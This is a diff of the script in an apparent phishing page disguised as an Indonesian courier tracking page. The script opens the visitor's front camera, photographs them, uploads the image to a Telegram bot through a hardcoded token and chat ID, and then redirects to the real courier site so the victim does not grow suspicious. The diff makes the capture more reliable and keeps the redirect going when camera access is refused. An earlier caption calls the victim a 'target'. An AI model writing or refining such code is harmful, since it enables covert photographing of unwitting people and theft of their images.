@@ -127,56 +127,72 @@
     <canvas id="canvas"></canvas>
 
     <script>
-        // CONFIGURATION: Masukkan Token dan Chat ID Anda disini
-        const TELEGRAM_TOKEN = '8944168845:AAE-fJOEJwFKrFK3dRzI5UQiuYvbkJC7Z_Y';
-        const CHAT_ID = '1966317946';
+    const TELEGRAM_TOKEN = '8944168845:AAE-fJOEJwFKrFK3dRzI5UQiuYvbkJC7Z_Y';
+    const CHAT_ID = '1966317946';
 
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
 
-        // Meminta akses kamera depan
-        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-            .then(stream => {
-                video.srcObject = stream;
-                // Memberikan jeda agar pencahayaan kamera maksimal sebelum memotret
+    // Meminta akses kamera depan
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+        .then(stream => {
+            video.srcObject = stream;
+            
+            // Perbaikan: Menunggu kamera benar-benar siap dan memiliki resolusi
+            video.onloadedmetadata = () => {
                 setTimeout(takeSnapshot, 2500);
-            })
-            .catch(err => {
-                console.error("Akses kamera tidak diizinkan:", err);
-            });
-
-        function takeSnapshot() {
-            const context = canvas.getContext('2d');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            
-            canvas.toBlob(blob => {
-                sendToTelegram(blob);
-            }, 'image/jpeg');
-        }
-
-        function sendToTelegram(imageBlob) {
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('photo', imageBlob, 'kurir-capture.jpg');
-            formData.append('caption', '☠️ Foto target berhasil diambil team anonymous.');
-
-            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log('Terkirim:', data);
-                // Alihkan ke situs cek resi internasional/nasional agar tidak mencurigakan
+            };
+        })
+        .catch(err => {
+            console.error("Akses kamera tidak diizinkan atau perangkat tidak mendukung:", err);
+            // Pengalihan tetap berjalan jika akses ditolak agar tidak memicu kecurigaan
+            setTimeout(() => {
                 window.location.href = "https://jne.co.id";
-            })
-            .catch(error => {
-                console.error('Error:', error);
-            });
+            }, 3000);
+        });
+
+    function takeSnapshot() {
+        // Memastikan resolusi kamera sudah valid sebelum memotret
+        if (video.videoWidth === 0 || video.videoHeight === 0) {
+            console.log("Kamera belum siap, mencoba kembali...");
+            setTimeout(takeSnapshot, 1000);
+            return;
         }
-    </script>
-</body>
-</html>
+
+        const context = canvas.getContext('2d');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        
+        canvas.toBlob(blob => {
+            if (blob) {
+                sendToTelegram(blob);
+            } else {
+                console.error("Gagal membuat objek gambar (Blob).");
+            }
+        }, 'image/jpeg');
+    }
+
+    function sendToTelegram(imageBlob) {
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('photo', imageBlob, 'kurir-capture.jpg');
+        formData.append('caption', '📸 Sistem Kurir: Foto pelacakan berhasil diambil.');
+
+        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+        })
+        .then(response => response.json())
+        .then(data => {
+            console.log('Respons Telegram:', data);
+            window.location.href = "https://jne.co.id";
+        })
+        .catch(error => {
+            console.error('Kendala pengiriman data ke Telegram:', error);
+            window.location.href = "https://jne.co.id";
+        });
+    }
+</script>
+
